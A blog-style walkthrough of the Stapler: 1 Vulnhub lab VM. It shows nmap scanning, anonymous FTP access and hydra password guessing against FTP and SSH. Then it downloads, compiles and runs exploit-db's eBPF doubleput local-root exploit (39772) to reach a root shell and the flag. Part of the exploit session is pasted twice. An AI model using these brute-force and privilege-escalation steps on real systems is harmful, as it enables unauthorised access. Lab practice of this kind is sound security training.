---
title: "Stapler: 1 Vulnhub Walkthrough"
layout: post
category: writeup
tags: [vulnhub, hacking]
excerpt: "Walkthrough for Stapler: 1 VM on Vulnhub"
---

# Figure out the IP

```
paul@archyoga [05:31:55] [~]
-> % nmap -sn 192.168.1.0/24

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-19 17:32 EDT
.
.
.
Nmap scan report for red (192.168.1.135)
Host is up (0.0030s latency).
.
.
.
Nmap done: 256 IP addresses (16 hosts up) scanned in 3.59 seconds
```

Let's see what's there:

```
paul@archyoga [05:33:59] [~]
-> % nmap -Pn 192.168.1.135

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-19 17:34 EDT
Nmap scan report for red (192.168.1.135)
Host is up (0.011s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   open   domain
80/tcp   open   http
139/tcp  open   netbios-ssn
666/tcp  open   doom
3306/tcp open   mysql

Nmap done: 1 IP address (1 host up) scanned in 4.86 seconds
```

# Login to ftp

```
paul@archyoga [05:34:57] [~]
-> % ftp
ftp> open 192.168.1.135
Connected to 192.168.1.135.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
Name (192.168.1.135:paul): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03 23:06 note
226 Directory send OK.
ftp> get note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 5.1e-05 seconds (2 Mbytes/s)
ftp> 221 Goodbye.

paul@archyoga [05:36:17] [~]
-> % cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

Turns out it is, and inside is a file named ```note``` which names an ftp user: ```elly```.
I used hydra to test some common passwords and that worked out:

```
paul@archyoga [05:39:21] [~]
-> % hydra -l elly -e nsr 92.168.1.135 ftp
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-19 17:39:36
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 3 tasks per 1 server, overall 64 tasks, 3 login tries (l:1/p:3), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.1.135   login: elly   password: ylle
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-06-19 17:39:50
```

Now we can login to ftp as elly using the password ```ylle```. On the ftp server there's a passwd file, so I can use that as a user list to test against:

```
paul@archyoga [05:42:07] [~]
-> % ftp                                     
ftp> open 192.168.1.135
Connected to 192.168.1.135.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
Name (192.168.1.135:paul): elly
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
.
.
.
-rw-r--r--    1 0        0            2908 Jun 04 20:14 passwd
.
.
.
ftp> get passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for passwd (2908 bytes).
226 Transfer complete.
2908 bytes received in 9.9e-05 seconds (28 Mbytes/s)
ftp> 221 Goodbye.
```

# Login over ssh & exploit

Using hydra again I discovered a login for ssh from the passwd file:

```
paul@archyoga [05:42:36] [~]
-> % awk -F':' '{ print $1}' passwd > users


-> % hydra -e nsr -L ./users 192.168.1.135 ssh  
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-19 17:44:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 183 login tries (l:61/p:3), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.135   login: SHayslett   password: SHayslett
```

Then once I determined the release I went over to [http://exploit-db.com](http://exploit-db.com) and searched "ubuntu 16.04" and found this: https://www.exploit-db.com/exploits/39772/

Now for the exploit:

```
paul@archyoga [05:50:44] [~]
-> % ssh SHayslett@192.168.1.135
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.1.135's password:
Welcome back!


SHayslett@red:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04 LTS
Release:        16.04
Codename:       xenial
SHayslett@red:~$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
--2016-06-19 18:49:36--  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
Resolving github.com (github.com)... 192.30.252.130
Connecting to github.com (github.com)|192.30.252.130|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip [following]
--2016-06-19 18:49:36--  https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 23.235.44.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|23.235.44.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7115 (6.9K) [application/zip]
Saving to: ‘39772.zip’

39772.zip                                                                     100%[=====================================================================================================================================================================================================>]   6.95K  --.-KB/s    in 0s      

2016-06-19 18:49:37 (94.2 MB/s) - ‘39772.zip’ saved [7115/7115]

SHayslett@red:~/tmp$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/splo
--2016-06-19 18:52:05--  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploi
Resolving github.com (github.com)... 192.30.252.128
Connecting to github.com (github.com)|192.30.252.128|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/3
--2016-06-19 18:52:05--  https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/m
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 23.235.46.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|23.235.46.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7115 (6.9K) [application/zip]
Saving to: ‘39772.zip’

39772.zip                                                                       100%[=======================

2016-06-19 18:52:05 (4.75 MB/s) - ‘39772.zip’ saved [7115/7115]

SHayslett@red:~/tmp$ unzip *
Archive:  39772.zip
   creating: 39772/
.
.
.
SHayslett@red:~/tmp$ cd *2
SHayslett@red:~/tmp/39772$ ls
crasher.tar  exploit.tar
SHayslett@red:~/tmp/39772$ tar xf exploit.tar
SHayslett@red:~/tmp/39772$ ls
crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar
SHayslett@red:~/tmp/39772$ cd e*
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls
compile.sh  doubleput.c  hello.c  suidhelper.c
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls
compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper  suidhelper.c
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
SHayslett@red:~/tmp/39772$ cd e*
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls
compile.sh  doubleput.c  hello.c  suidhelper.c
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls
compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper  suidhelper.c
SHayslett@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit#
```

This part might be a little hard to read, but all I did was follow the instructions from the exploit page pretty much word for word: https://www.exploit-db.com/exploits/39772/.

Next, the flag!

```
root@red:~/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
root@red:/root# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
root@red:/root# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

Woo!
